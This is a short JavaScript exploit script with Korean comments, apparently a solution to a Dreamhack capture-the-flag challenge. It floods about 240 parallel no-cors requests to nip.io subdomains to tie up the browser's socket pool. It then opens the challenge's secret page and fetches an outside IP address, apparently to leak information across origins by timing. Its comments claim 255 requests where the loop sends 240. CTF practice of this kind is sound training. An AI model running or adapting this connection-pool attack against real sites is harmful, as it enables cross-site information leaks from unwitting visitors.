// 255개의 /block 요청을 보내 소켓을 차단하는 함수
async function blockSockets() {
    const promises = [];

    // 0~254번 서브 도메인으로 블락 요청을 보냄
    for (let i = 0; i < 240; i++) {
        const subdomain = `service-${i}.10.10.34.168.nip.io`;  // 서브 도메인 설정
        const url = `http://${subdomain}/block`;
        promises.push(fetch(url, { mode: "no-cors", cache: "no-store" }));
    }

    // 모든 /block 요청을 동시에 보냄
    await Promise.all(promises);
    console.log("255개의 블락 요청이 완료되었습니다.");
}

// 전체 프로세스를 실행하는 함수
async function executeBlockingStrategy() {
    // 255개의 블락 요청을 먼저 보내어 소켓을 차단
    await blockSockets();
}

// 코드 실행
executeBlockingStrategy();




open('http://host3.dreamhack.games:8782/secret/0');
await fetch('http://211.55.102.48:80', { cache: 'no-store' });


